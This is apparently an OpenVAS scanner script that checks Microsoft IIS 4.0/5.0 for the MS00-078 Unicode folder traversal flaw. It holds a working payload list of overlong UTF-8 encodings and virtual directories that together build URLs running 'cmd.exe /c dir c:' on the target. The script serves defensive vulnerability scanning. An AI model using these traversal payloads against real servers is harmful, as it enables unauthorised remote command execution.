# OpenVAS Vulnerability Test
# $Id: remote-MS00-078.nasl 15 2013-10-27 12:49:54Z jan $
# Description: 
# Microsoft Security Bulletin (MS00-078)
# 'Web Server Folder Traversal' Vulnerability 
# Microsoft IIS Executable File Parsing Vulnerability (MS00-086)
#
# Affected Software: 
# Microsoft Internet Information Server 4.0 
# Microsoft Internet Information Server 5.0 
#
# remote-MS00-078.nasl
#
# Author:
# Christian Eric Edjenguele <christian.edjenguele@owasp.org>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2 or later,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "Microsoft IIS 4.0 and 5.0 are affected by a web server trasversal vulnerability.
This vulnerability could potentially allow a visitor to a web site to take a wide range of destructive actions against it, 
including running programs on it.";

tag_solution = "There is not a new patch for this vulnerability. Instead, it is eliminated by the patch that accompanied Microsoft Security Bulletin MS00-057.
Download locations for this patch

Microsoft IIS 4.0:
http://support.microsoft.com/kb/269862/en-us 
 
Microsoft IIS 5.0:
http://technet.microsoft.com/windowsserver/2000/default.aspx";


desc = "
Summary:
" + tag_summary + "
Solution:
" + tag_solution;

if(description)
{
script_id(101014);
script_version("$Revision: 15 $");
script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
script_tag(name:"creation_date", value:"2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)");
script_tag(name:"cvss_base", value:"7.5");
script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
script_tag(name:"risk_factor", value:"High");
script_cve_id("CVE-2000-0884");
script_bugtraq_id(1806);
name = "Microsoft MS00-078 security check";
script_name(name);
 
script_description(desc);
 
summary = "Microsoft IIS 4.0 and 5.0 are prone to web server trasversal vulnerabilities";
 
script_summary(summary);
 
script_category(ACT_ATTACK);
 
script_copyright("Christian Eric Edjenguele <christian.edjenguele@owasp.org>");
family = "Windows : Microsoft Bulletins";
script_family(family);
script_require_ports("Services/www");
 
if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
}
exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!get_port_state(port))exit(0);;
# remote command to run
r_cmd = '/winnt/system32/cmd.exe?/c+dir+c:';

d = make_list('/scripts/', 
	'/msadc/', 
	'/iisadmpwd/', 
	'/_vti_bin/', 
	'/_mem_bin/', 
	'/exchange/', 
	'/pbserver/', 
	'/rpc/', 
	'/cgi-bin/', 
	'/');

uc = make_list('%c0%af',
		'%c0%9v',
		'%c1%c1',
		'%c0%qf',
		'%c1%8s',
		'%c1%9c',
		'%c1%pc',
		'%c1%1c',
                 '%c0%2f',
                 '%e0%80%af');


foreach webdir (d)  {
  foreach uni_code (uc) { 

    # build the malicious url
    url = strcat(webdir , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , uni_code , '..' , r_cmd);
			
    # build the query
    qry = string('/' + url);
				
    req = http_get(item:qry, port:port);
				
    # get back the response
    reply = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
			
    if(reply) {
	
      header_server = egrep(pattern:"Server", string:reply, icase:TRUE);
      if(("Microsoft-IIS" >< header_server ) && (egrep(pattern:"HTTP/1.[01] 200", string:reply)) && (("<dir>" >< reply) ||
          'directory of' >< reply)) {
        report = string(desc, "\n\nExploit String",url," for vulnerability:\n",reply,"\n");;
        security_hole(port:port, data:report);
        exit(0);
      }  

    }  
  }
}

exit(0);
